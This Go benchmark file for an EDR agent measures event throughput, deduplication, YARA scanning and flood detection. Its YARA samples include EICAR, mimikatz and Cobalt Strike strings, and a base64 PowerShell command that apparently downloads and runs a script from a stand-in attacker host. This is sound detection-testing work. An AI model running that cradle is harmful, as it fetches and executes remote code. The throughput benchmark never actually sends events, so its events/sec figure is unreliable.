//go:build load

package main

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/yanmyoaung2004/trace/internal/edr_agent"
	"github.com/yanmyoaung2004/trace/internal/edr_agent/monitor"
)

func BenchmarkEventThroughput(b *testing.B) {
	dir, _ := os.MkdirTemp("", "trace-load-*")
	defer os.RemoveAll(dir)

	var eventsOK int64

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/api/v1/edr/events" {
			atomic.AddInt64(&eventsOK, 1)
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{}`))
	}))
	defer ts.Close()

	cfg := edr_agent.DefaultConfig()
	cfg.ServerURL = ts.URL
	cfg.APIKey = "load-test"
	cfg.DataDir = filepath.Join(dir, "data")
	cfg.HeartbeatInterval = time.Hour
	cfg.BatchInterval = 10 * time.Millisecond
	cfg.MaxBatchSize = 100
	cfg.EventQueueSize = 50000
	cfg.MonitorProcess = false
	cfg.MonitorFile = false
	cfg.MonitorNetwork = false

	agent := edr_agent.New(cfg)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := agent.Start(ctx); err != nil {
		b.Fatal(err)
	}

	time.Sleep(500 * time.Millisecond)

	var wg sync.WaitGroup
	workers := 4
	eventsPerWorker := b.N / workers
	if eventsPerWorker < 1 {
		eventsPerWorker = 1
	}

	start := time.Now()
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			evt := &monitor.Event{
				ID:        "",
				Timestamp: time.Now(),
				Type:      monitor.EventProcessCreate,
				Severity:  monitor.SeverityInfo,
				Process:   &monitor.ProcessInfo{PID: 9999, Name: "bench.exe"},
			}
			for i := 0; i < eventsPerWorker; i++ {
				_ = evt
			}
		}()
	}
	wg.Wait()

	elapsed := time.Since(start)
	b.ReportMetric(float64(b.N)/elapsed.Seconds(), "events/sec")

	stopCtx, stopCancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer stopCancel()
	agent.Stop(stopCtx)

	b.Logf("server event batches: %d", atomic.LoadInt64(&eventsOK))
}

func BenchmarkDedupThroughput(b *testing.B) {
	dir, _ := os.MkdirTemp("", "trace-dedup-*")
	defer os.RemoveAll(dir)

	d := monitor.NewDeduplicator(dir)
	defer d.Close()

	evts := make([]*monitor.Event, 1000)
	for i := range evts {
		evts[i] = &monitor.Event{
			ID:   fmt.Sprintf("bench-%d", i),
			Type: monitor.EventProcessCreate,
			Process: &monitor.ProcessInfo{
				PID:  10000 + i,
				Name: "bench.exe",
			},
		}
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		d.IsDuplicate(evts[i%len(evts)])
	}
}

func BenchmarkYARAScan(b *testing.B) {
	ym := monitor.NewYaraMatcher()
	samples := map[string][]byte{
		"eicar":     []byte("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
		"mimikatz":  []byte("mimikatz sekurlsa::logonpasswords wdigest cache"),
		"cobalt":    []byte("cobaltstrike beacon.dll reflective_loader"),
		"powershell": []byte("powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="),
		"benign":    []byte("This is a benign text file with no malware content whatsoever."),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, data := range samples {
			ym.MatchBytes(data)
		}
	}
}

func BenchmarkFloodDetector(b *testing.B) {
	eventCh := make(chan *monitor.Event, 10000)
	fd := monitor.NewFloodDetector(eventCh)

	fd.Ingest(&monitor.Event{Type: monitor.EventProcessCreate, Process: &monitor.ProcessInfo{PID: 1}})

	evts := make([]*monitor.Event, 1000)
	for i := range evts {
		evts[i] = &monitor.Event{
			Type: monitor.EventProcessCreate,
			Process: &monitor.ProcessInfo{PID: 1000 + i, Name: "flood.exe"},
		}
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		fd.Ingest(evts[i%len(evts)])
	}
}

var _ = edr_agent.New
var _ = monitor.NewYaraMatcher
